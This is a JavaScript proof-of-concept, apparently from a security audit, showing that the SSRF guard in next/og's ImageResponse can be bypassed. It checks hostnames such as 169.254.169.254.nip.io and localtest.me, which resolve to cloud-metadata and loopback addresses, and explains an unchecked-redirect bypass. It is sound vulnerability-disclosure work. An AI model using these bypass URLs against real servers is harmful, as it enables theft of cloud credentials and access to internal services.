// PoC: next/og ImageResponse SSRF guard is bypassable (Finding H7).
// Runs the SHIPPED guard (Ms/Xu, extracted verbatim from @vercel/og index.node.js)
// against attacker <img src> hostnames. The guard's job is to block the fetch to
// private/metadata addresses ("SSRF protection"). We show it blocks LITERAL IPs
// but ALLOWS any hostname that resolves to a private IP (nip.io / localtest.me)
// and never re-checks HTTP redirects. Localhost/metadata targets only; defensive.
import { ssrfGuard } from './_og_guard_extracted.mjs'

function tryGuard(url) {
  try { ssrfGuard(url); return 'ALLOWED (fetch proceeds)' }
  catch (e) { return 'blocked: ' + e.message.replace(/\s+/g,' ').slice(0,60) }
}

const cases = [
  ['http://169.254.169.254/latest/meta-data/', 'literal cloud-metadata IP'],
  ['http://127.0.0.1:9200/', 'literal loopback'],
  ['http://169.254.169.254.nip.io/latest/meta-data/', 'DNS name -> 169.254.169.254 (BYPASS)'],
  ['http://127.0.0.1.nip.io/', 'DNS name -> 127.0.0.1 (BYPASS)'],
  ['http://localtest.me/', 'DNS name -> 127.0.0.1 (BYPASS)'],
  ['https://cdn.example.com/logo.png', 'benign public host'],
]
console.log('next/og shipped SSRF guard — verdict per attacker-supplied <img src>:\n')
for (const [url, note] of cases) {
  console.log('  ' + tryGuard(url).padEnd(34), url, ' <- ' + note)
}
console.log('\nConclusion: literal private IPs are blocked, but a hostname that DNS-resolves')
console.log('to a private IP is ALLOWED (guard only checks literal IPv4/IPv6, never resolves).')
console.log('Combined with fetch() using redirect:"follow" (no redirect:"manual" in the bundle),')
console.log('an allowed public host that 302-redirects to a private IP is also reached.')
